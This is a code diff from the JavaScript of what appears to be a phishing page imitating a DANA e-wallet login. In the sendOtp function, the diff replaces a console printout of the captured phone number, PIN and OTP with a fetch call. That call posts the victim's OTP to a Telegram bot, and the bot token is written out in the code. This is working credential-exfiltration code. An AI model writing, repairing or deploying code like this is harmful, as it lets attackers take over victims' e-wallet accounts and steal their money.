@@ -80,23 +80,9 @@ function sendOtp(){
     otp += $(this).val();
   });
 
-  let text = `
-╔═══〔 DANA LOGIN DEMO 〕═══╗
+  let text = "📬 *OTP MASUK*\n`" + otp + "`";
 
-📱 Nomor :
-➜ ${nohp}
-
-🔐 PIN :
-➜ ${pin}
-
-📨 OTP :
-➜ ${otp}
-
-╚══════════════════════╝
-`;
-
-console.log(text)';
-
+ 
   fetch("https://api.telegram.org/bot7526261524:AAEnSkCLR65aK9H_bZWGxU8cNkajvo-takw/sendMessage", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
